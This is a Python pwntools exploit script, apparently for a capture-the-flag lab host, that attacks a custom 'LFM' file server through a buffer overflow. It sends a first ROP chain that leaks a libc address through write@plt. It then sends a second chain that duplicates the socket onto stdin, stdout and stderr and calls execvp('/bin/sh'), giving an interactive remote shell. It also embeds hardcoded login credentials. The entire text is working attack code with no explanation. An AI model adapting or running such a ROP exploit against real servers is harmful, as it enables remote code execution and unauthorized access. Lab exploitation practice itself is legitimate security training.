#!/usr/bin/python3
from pwn import remote, p64, u64
from urllib.parse import quote

shell = remote("10.10.10.173", 8888)

offset = 148
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(0x405c4b) # pop rdi; ret;
payload += p64(0x6)      # descriptor
payload += p64(0x405c49) # pop rsi; pop r15; ret;
payload += p64(0x409020) # dup2@got
payload += p64(0x0)      # padding for pop
payload += p64(0x402420) # write@plt

request  = b""
request += f"CHECK /convert.php%xx{quote(payload)} LFM\r\n".encode()
request += b"User=lfmserver_user\r\n"
request += b"Password=!gby0l0r0ck$$!\r\n\r\n"
request += b"b56a569c6162f6f04ea71e581beadf68"

shell.sendline(request)
shell.recvlines(4)

libc_base = u64(shell.recv(9)[1:]) - 0x10a6c0

shell.close()
shell = remote("10.10.10.173", 8888)

payload  = b""
payload += junk
payload += p64(libc_base + 0x023a6f)     # pop rdi; ret;
payload += p64(0x6)                      # oldfd

for i in range(0, 3):
    payload += p64(libc_base + 0x0244ce) # pop rsi; ret;
    payload += p64(i)                    # newfd
    payload += p64(libc_base + 0x10a6c0) # dup2()

payload += p64(libc_base + 0x023a6f)     # pop rdi; ret;
payload += p64(libc_base + 0x1aae80)     # "/bin/sh"
payload += p64(libc_base + 0x0244ce)     # pop rsi; ret;
payload += p64(0x0)                      # NULL
payload += p64(libc_base + 0x1290c6)     # pop rdx; ret;
payload += p64(0x0)                      # NULL
payload += p64(libc_base + 0x0dee40)     # execvp()

request  = b""
request += f"CHECK /convert.php%xx{quote(payload)} LFM\r\n".encode()
request += b"User=lfmserver_user\r\n"
request += b"Password=!gby0l0r0ck$$!\r\n\r\n"
request += b"b56a569c6162f6f04ea71e581beadf68"

shell.sendline(request)
shell.recvlines(4)

shell.interactive()
